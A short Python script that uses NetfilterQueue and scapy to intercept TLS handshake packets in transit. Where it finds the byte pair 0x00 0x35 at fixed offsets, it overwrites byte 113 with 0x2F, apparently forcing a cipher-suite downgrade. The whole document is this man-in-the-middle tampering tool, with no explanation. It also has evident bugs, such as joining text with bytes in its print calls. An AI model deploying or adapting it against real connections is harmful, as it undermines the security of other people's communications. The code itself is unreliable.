from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP

def process_packet(pkt):
    ip_packet = IP(pkt.get_payload())

    if ip_packet.haslayer('Raw'):
        payload = ip_packet['Raw'].load
        if payload[0] == 0x16 and payload[1] == 0x03 \
                      and payload[46] == 0x00 and payload[47] == 0x35:

            print('Old payload: ' + pkt.get_payload())

            new_payload = [p for p in pkt.get_payload()]
            new_payload[113] = 0x2F
            pkt.set_payload(bytes(new_payload))

            print('New payload: ' + pkt.get_payload())

    pkt.accept()


def main():
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('End of processing')

    nfqueue.unbind()

if __name__ == '__main__':
    main()
